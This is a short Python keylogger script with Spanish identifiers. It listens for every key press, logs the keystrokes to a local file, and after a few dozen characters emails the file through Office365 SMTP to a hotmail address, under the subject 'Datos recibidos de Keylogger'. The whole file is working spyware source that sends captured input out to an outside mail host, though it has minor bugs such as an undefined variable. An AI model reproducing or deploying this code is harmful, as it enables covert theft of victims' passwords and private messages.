import sys
import smtplib
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from threading import Thread
from pynput.keyboard import Listener

def capturadeteclas(key):
    teclas = str(key)
    teclas = teclas.replace("'", "")
    print(teclas)
    if teclas == "Key.enter":
        teclas = " [ENTER] "
    if teclas == "Key.space":
        teclas = " "    
    if teclas == "Key.esc":
        sys.exit()

    file = open("log","a")
    file.write(tecla)
    file.close()

    file = open("log","r")
    data = file.read()
    file.close()

    if len(data)>41:
        fil = open("send","a")
        fil.write(data)

        file = open("log","w")
        file.write("")
        file.close()

        env = Thread(target=envios)
        env.start()

def envios():
    msg = MIMEMultipart("plain")
    msg["From"] = "correodepruebasdusan@outlook.com"
    msg["To"] = "correodepruebasmel@hotmail.com"
    msg["Subject"] = "Datos recibidos de Keylogger"

    adjunto = MIMEBase("aplication","octect-stream")
    adjunto.set_payload(open("send","r").read())
    adjunto.add_header("content-Disposition",'attachment; filename=mensaje.txt"')
    msg.attach(adjunto) 

    smtp = smtplib.SMTP("smtp.office365.com:587")
    smtp.starttls()
    smtp.login("correodepruebasdusan@outlook.com","**********")
    smtp.sendmail("correodepruebadusan@outlook.com","correodepruebasmel@hotmail.com",msg.as_string())
    smtp.quit()
with Listener(on_press=capturadeteclas) as Listen:
    Listen.join()  
